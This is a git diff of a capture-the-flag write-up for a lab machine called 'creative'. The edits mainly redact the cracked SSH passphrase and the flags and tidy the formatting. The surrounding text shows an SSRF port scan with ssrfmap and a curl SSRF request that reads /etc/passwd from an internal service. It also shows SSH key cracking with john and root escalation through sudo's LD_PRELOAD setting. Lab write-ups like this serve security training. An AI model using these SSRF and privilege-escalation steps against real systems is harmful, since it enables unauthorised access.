@@ -225,7 +225,9 @@ $ python3 ssrfmap.py -r /home/kali/creative/requests.txt -p url -m portscan
 	[13:30:31] IP:127.0.0.1   , Found filtered  port n°445                    
 	[13:30:31] IP:127.0.0.1   , Found filtered  port n°143                    
 	[13:30:31] IP:127.0.0.1   , Found filtered  port n°139                    
-	[13:30:31] IP:127.0.0.1   , Found filtered  port n°135                    
+	[13:30:31] IP:127.0.0.1   , Found filtered  port n°135
+...
+...             
 ```
 ## Fuzzing Internal services 
 ```bash
@@ -268,7 +270,7 @@ ________________________________________________
 ![Internal](internal.png)
 ## Checking users
 ```bash
-curl -X POST "http://beta.creative.thm" -d "url=http://127.0.0.1:1337/etc/passwd" --output -  
+$ curl -X POST "http://beta.creative.thm" -d "url=http://127.0.0.1:1337/etc/passwd" --output -  
 
 root:x:0:0:root:/root:/bin/bash
 saad:x:1000:1000:saad:/home/saad:/bin/bash
@@ -318,7 +320,7 @@ Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
 Cost 2 (iteration count) is 16 for all loaded hashes
 ...
-sweetness        (id_rsa)     
+sweet***        (id_rsa)     
 ...
 ...
 Session completed.                  
@@ -338,7 +340,7 @@ saad@m4lware:~$
 
 ## User Flag
 ```bash
-9a1ce90a7653d74ab98630b47b8b4a84
+9a1ce90a76{redacted}98630b47b8b4a84
 ```
 ## Password History
 > found in linpeas results
@@ -354,11 +356,11 @@ saad@m4lware:~$
 # We didn't find ping in GTFObins
 -rwxr-xr-x 1 root root 72776 Jan 30  2020 /usr/bin/ping 
 
-# environment variable `LD_PRELOAD` Shared Library 
+# found environment variable `LD_PRELOAD` Shared Library 
 env_keep+=LD_PRELOAD
 ```
 
-## Sudoers 
+## Checking Sudoers 
 ```bash
 saad@m4lware:~$ sudo -l 
 [sudo] password for saad: 
@@ -401,6 +403,6 @@ root@m4lware:/home/saad# id
 uid=0(root) gid=0(root) groups=0(root)
 
 root@m4lware:~# cat root.txt 
-992bfd94b90da48634aed182aae7b99f
+992bfd94b9{redactred}4aed182aae7b99f
 
 ```
